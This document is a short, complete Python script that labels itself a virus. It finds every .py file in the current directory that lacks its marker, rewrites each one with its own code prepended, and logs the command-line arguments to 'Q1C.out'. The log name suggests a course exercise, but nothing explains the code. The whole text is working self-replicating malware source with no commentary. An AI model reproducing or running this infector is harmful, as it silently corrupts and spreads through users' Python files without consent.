# virus start
import sys, glob
def file_finder(directory="."):
	return[file for file in glob.glob("*.py")]
def file_content(filename):
	info = None
	with open(filename, "r") as file:
		info = file.readlines()
	return info
def infectable(filename):
	info = file_content(filename)
	for line in info:
		if "# virus start\n" in line:
			return None
	return info
def virus_infect(filename, code):
	if (data:=infectable(filename)):
		with open(filename, "w") as infect_file:
			infect_file.write("".join(code))
			infect_file.writelines(data)
def code():
	extract = False
	virus = []
	text = file_content(__file__)
	for line in text:
		if "# virus start\n" in line:
			extract = True
		if extract:
			virus.append(line)
		if "# virus end\n" in line:
			extract = False
			break
	return virus
def append_file(line):
	output = "Q1C.out"
	with open(output, 'a') as x:
		x.write(line + '\n')
def infection():
	line = " ".join(sys.argv)
	append_file(line)
	c = code()
	for files in file_finder():
		virus_infect(files, c)
if __name__ == "__main__":
	infection()
# virus end
